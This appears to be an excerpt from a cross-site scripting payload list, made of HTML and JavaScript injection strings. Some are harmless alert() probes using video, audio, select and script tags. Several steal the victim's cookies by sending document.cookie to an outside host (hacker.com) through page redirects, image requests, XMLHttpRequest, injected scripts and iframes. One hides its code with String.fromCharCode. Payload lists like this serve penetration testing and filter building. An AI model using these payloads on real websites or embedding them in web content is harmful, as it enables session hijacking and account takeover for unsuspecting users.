...
<video src="javascript:alert('XSS')">
<audio src="javascript:alert('XSS')">
...
<select onfocus="javascript:alert('XSS')">
<script>alert(1)</script>
<script>document.location='https://www.hacker.com/xss.php?c='+document.cookie</script>
<script>document.write('<img src="https://www.hacker.com/xss.php?c='+document.cookie+'" />')</script>
<script>var i=new Image;i.src='https://www.hacker.com/xss.php?c='+document.cookie;</script>
<script>var xhr=new XMLHttpRequest();xhr.open("GET","https://www.hacker.com/xss.php?c="+document.cookie,true);xhr.send();</script>
<script>var s=document.createElement('script');s.src='https://www.hacker.com/xss.php?c='+document.cookie;document.body.appendChild(s);</script>
<script>var f=document.createElement('iframe');f.src='https://www.hacker.com/xss.php?c='+document.cookie;document.body.appendChild(f);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<img src=x onerror="javascript:document.location='https://www.hacker.com/xss.php?c='+document.cookie">
